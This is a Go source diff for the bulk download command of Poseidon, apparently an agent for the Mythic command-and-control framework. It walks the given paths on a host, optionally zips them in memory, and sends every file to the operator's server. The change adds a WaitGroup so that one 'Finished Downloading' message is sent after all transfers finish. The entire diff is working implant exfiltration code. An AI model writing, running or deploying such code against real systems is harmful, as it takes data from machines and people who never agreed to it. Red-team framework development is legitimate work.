@@ -8,6 +8,7 @@ import (
 	"io"
 	"os"
 	"path/filepath"
+	"sync"
 	"time"
 
 	// Poseidon
@@ -81,14 +82,13 @@ func Run(task structs.Task) {
 	msg := task.NewResponse()
 	args := bulkDownloadArgs{}
 	err := json.Unmarshal([]byte(task.Params), &args)
-	
+
 	if err != nil {
 		msg.SetError(fmt.Sprintf("Failed to parse parameters: %s", err.Error()))
 		task.Job.SendResponses <- msg
 		return
 	}
 
-	// Check if compression is enabled
 	if args.Compress {
 		// Compress the specified files and directories into a zip archive in memory
 		zipBuffer, err := zipFilesAndDirectories(args.Paths)
@@ -113,98 +113,94 @@ func Run(task structs.Task) {
 		task.Job.SendFileToMythic <- downloadMsg
 
 		handleTransferCompletion(task, downloadMsg)
+		// Send completed message after transfer
+		msg.Completed = true
+		msg.UserOutput = "Finished Downloading"
+		task.Job.SendResponses <- msg
 	} else {
 		// Handle files directly without compression
+		var wg sync.WaitGroup
+		filesStarted := 0
 		for _, path := range args.Paths {
-		        fullPath, err := filepath.Abs(path)
-		        if err != nil {
-		            msg.UserOutput = fmt.Sprintf("Error resolving path: %s", err.Error())
-		            task.Job.SendResponses <- msg
-								continue
-		        }
-		
-		        // Check if the provided path is a directory
-		        fi, err := os.Stat(fullPath)
-		        if err != nil {
-		            msg.UserOutput = fmt.Sprintf("Error accessing path: %s", err.Error())
-		            task.Job.SendResponses <- msg
-		            continue
-		        }
-		
-		        if fi.IsDir() {
-		            // If it's a directory, walk through all its files
-		            err := filepath.Walk(fullPath, func(filePath string, info os.FileInfo, walkErr error) error {
-		                if walkErr != nil {
-		                    return fmt.Errorf("error walking through path %s: %w", filePath, walkErr)
-		                }
-		
-		                if !info.IsDir() { // Process only files
-		                    file, err := os.Open(filePath)
-		                    if err != nil {
-		                        msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
-		                        task.Job.SendResponses <- msg
-		                        return fmt.Errorf("error opening file: %w", err)
-		                    }
-		
-		                    // Prepare the download message for the file
-		                    downloadMsg := structs.SendFileToMythicStruct{
-		                        Task:                 &task,
-		                        IsScreenshot:         false,
-		                        SendUserStatusUpdates: true,
-		                        File:                 file,
-		                        FileName:             info.Name(),
-		                        FullPath:             filePath,
-		                        FinishedTransfer:     make(chan int, 2),
-		                    }
-		
-		                    // Send the file to Mythic
-		                    task.Job.SendFileToMythic <- downloadMsg
-		
-		                    // Handle file transfer completion and close the file after completing
-		                    go func(file *os.File) {
-		                        handleTransferCompletion(task, downloadMsg)
-		                        file.Close() // Close the file after transfer is complete
-		                    }(file)
-		                }
-		                return nil
-		            })
-		
-		            if err != nil {
-		                msg.SetError(fmt.Sprintf("Error walking through directory %s: %s", fullPath, err.Error()))
-		                task.Job.SendResponses <- msg
-		                return
-		            }
-		        } else {
-		            // If it's a file, process it directly
-		            file, err := os.Open(fullPath)
-		            if err != nil {
-		                msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
-		                task.Job.SendResponses <- msg
-										return
-		            }
-		
-		            // Prepare the download message for the file
-		            downloadMsg := structs.SendFileToMythicStruct{
-		                Task:                 &task,
-		                IsScreenshot:         false,
-		                SendUserStatusUpdates: true,
-		                File:                 file,
-		                FileName:             fi.Name(),
-		                FullPath:             fullPath,
-		                FinishedTransfer:     make(chan int, 2),
-		            }
-		
-		            // Send the file to Mythic
-		            task.Job.SendFileToMythic <- downloadMsg
-		
-		            // Handle file transfer completion and close the file after completing
-		            go func(file *os.File) {
-		                handleTransferCompletion(task, downloadMsg)
-		                file.Close() // Close the file after transfer is complete
-		            }(file)
-		        }
-		    }
+			fullPath, err := filepath.Abs(path)
+			if err != nil {
+				msg.UserOutput = fmt.Sprintf("Error resolving path: %s", err.Error())
+				task.Job.SendResponses <- msg
+				continue
+			}
+
+			fi, err := os.Stat(fullPath)
+			if err != nil {
+				msg.UserOutput = fmt.Sprintf("Error accessing path: %s", err.Error())
+				task.Job.SendResponses <- msg
+				continue
+			}
+
+			if fi.IsDir() {
+				filepath.Walk(fullPath, func(filePath string, info os.FileInfo, walkErr error) error {
+					if walkErr != nil {
+						return fmt.Errorf("error walking through path %s: %w", filePath, walkErr)
+					}
+					if !info.IsDir() {
+						file, err := os.Open(filePath)
+						if err != nil {
+							msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
+							task.Job.SendResponses <- msg
+							return fmt.Errorf("error opening file: %w", err)
+						}
+						wg.Add(1)
+						filesStarted++
+						downloadMsg := structs.SendFileToMythicStruct{
+							Task:                 &task,
+							IsScreenshot:         false,
+							SendUserStatusUpdates: true,
+							File:                 file,
+							FileName:             info.Name(),
+							FullPath:             filePath,
+							FinishedTransfer:     make(chan int, 2),
+						}
+						task.Job.SendFileToMythic <- downloadMsg
+						go func(file *os.File, dm structs.SendFileToMythicStruct) {
+							handleTransferCompletion(task, dm)
+							file.Close()
+							wg.Done()
+						}(file, downloadMsg)
+					}
+					return nil
+				})
+			} else {
+				file, err := os.Open(fullPath)
+				if err != nil {
+					msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
+					task.Job.SendResponses <- msg
+					continue
+				}
+				wg.Add(1)
+				filesStarted++
+				downloadMsg := structs.SendFileToMythicStruct{
+					Task:                 &task,
+					IsScreenshot:         false,
+					SendUserStatusUpdates: true,
+					File:                 file,
+					FileName:             fi.Name(),
+					FullPath:             fullPath,
+					FinishedTransfer:     make(chan int, 2),
+				}
+				task.Job.SendFileToMythic <- downloadMsg
+				go func(file *os.File, dm structs.SendFileToMythicStruct) {
+					handleTransferCompletion(task, dm)
+					file.Close()
+					wg.Done()
+				}(file, downloadMsg)
+			}
 		}
+		if filesStarted > 0 {
+			wg.Wait()
+		}
+		msg.Completed = true
+		msg.UserOutput = "Finished Downloading"
+		task.Job.SendResponses <- msg
+	}
 }
 
 // handleTransferCompletion handles the completion of the file transfer
@@ -212,10 +208,6 @@ func handleTransferCompletion(task structs.Task, downloadMsg structs.SendFileToM
 	for {
 		select {
 		case <-downloadMsg.FinishedTransfer:
-			msg := task.NewResponse()
-			msg.Completed = true
-			msg.UserOutput = "Finished Downloading"
-			task.Job.SendResponses <- msg
 			return
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
